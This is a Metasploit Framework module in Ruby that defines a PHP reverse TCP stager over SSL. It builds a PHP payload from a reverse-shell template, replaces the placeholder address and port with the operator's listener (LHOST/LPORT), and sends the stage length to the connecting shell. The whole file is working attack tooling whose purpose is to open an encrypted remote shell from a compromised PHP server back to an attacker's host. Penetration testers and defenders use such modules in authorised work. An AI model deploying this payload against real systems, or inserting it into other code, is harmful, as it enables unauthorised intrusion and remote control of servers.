##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/php'
require 'msf/core/handler/reverse_tcp_ssl'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 1318

  include Msf::Payload::Stager
  include Msf::Payload::Php

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'PHP Reverse TCP SSL Stager',
      'Description'   => 'Reverse PHP connect back stager with checks for disabled functions and SSL encryption',
      'Author'        => ['egypt', 'RageLtMan <rageltman[at]sempervictus>'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'Stager'        => {'Payload' => ""}
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    reverse = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'reverse_tcp.php'))
    reverse.gsub!('tcp://','ssl://')
    reverse.gsub!("127.0.0.1", "#{datastore["LHOST"]}")
    reverse.gsub!("4444", "#{datastore["LPORT"]}")
    reverse.gsub!(/#.*$/, '')
    reverse = Rex::Text.compress(reverse)

    return super + reverse
  end

  #
  # PHP's read functions suck, make sure they know exactly how much data to
  # grab by sending a length.
  #
  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end

end
